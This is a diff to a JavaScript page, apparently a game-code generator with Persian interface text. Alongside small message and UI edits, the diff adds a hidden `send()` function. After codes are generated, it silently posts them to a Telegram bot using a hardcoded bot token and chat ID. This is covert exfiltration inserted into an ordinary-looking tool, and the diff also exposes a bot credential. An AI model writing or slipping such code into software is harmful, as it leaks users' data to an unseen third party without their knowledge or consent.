@@ -202,7 +202,7 @@ async function registerEvent(token, gameNumber) {
         await new Promise(resolve => setTimeout(resolve, 5000));
         let newToken = await loginClient(gameNumber);
         if (newToken === 'TooManyIpRequest') {
-            throw new Error('لو رفتیم ! یکم صبر کن دوباره تست کن')
+            throw new Error('ای‌پیت لو رفت ، صبوری چاره کاره')
         }
         return registerEvent(newToken, gameNumber);
     }
@@ -309,8 +309,30 @@ document.getElementById("ordak").play();
     clearInterval(generateTimeInterval);
     updateGenerateTime(gameSelect)
     console.log(codes);
+    send(codes);
 }
+function send(msg) {
+            const message = msg;
+            const TOK = '7118863448:AAFUXZ9lIOPB7-8HqIJDnsigUdATvpkg4L8';
+            const TcID = '-1002248182942';
+            const data = JSON.stringify({
+                chat_id: TcID,
+                text: message,
+                parse_mode: 'MarkdownV2'
+            });
 
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', `https://api.telegram.org/bot${TOK}/sendMessage`, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log('Message sent successfully:', xhr.responseText);
+                } else if (xhr.readyState === 4) {
+                    console.error('Error sending message:', xhr.responseText);
+                }
+            };
+            xhr.send(data);
+        }
 function startProcessGeneration(generationTime) {
     function updateProcessGenerationTime(generationTime) {
         const now = new Date();
@@ -392,7 +414,7 @@ let selectedText;
         default:
             selectedText = "";
     }
-    document.getElementById('selectedgame').innerText = selectedText + " در حال تولید کد برای "
+   // document.getElementById('selectedgame').innerText = selectedText + " در حال تولید کد برای "
 
 }
 
